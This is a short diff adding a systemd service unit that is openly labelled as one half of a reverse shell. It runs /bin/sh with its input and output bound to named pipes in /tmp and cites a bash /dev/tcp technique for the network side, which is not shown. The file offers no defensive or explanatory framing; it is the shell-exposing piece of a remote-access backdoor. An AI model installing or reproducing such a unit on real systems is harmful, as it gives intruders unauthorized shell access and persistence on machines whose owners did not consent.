@@ -1,0 +1,10 @@
+; https://www.freedesktop.org/software/systemd/man/systemd.service.html
+[Unit]
+Description=A simple reverse shell - sh half
+
+[Service]
+Type=simple
+; https://github.com/fijimunkii/bash-dev-tcp
+StandardInput=file:/tmp/backpipe
+StandardOutput=file:/tmp/frontpipe
+ExecStart=/bin/sh
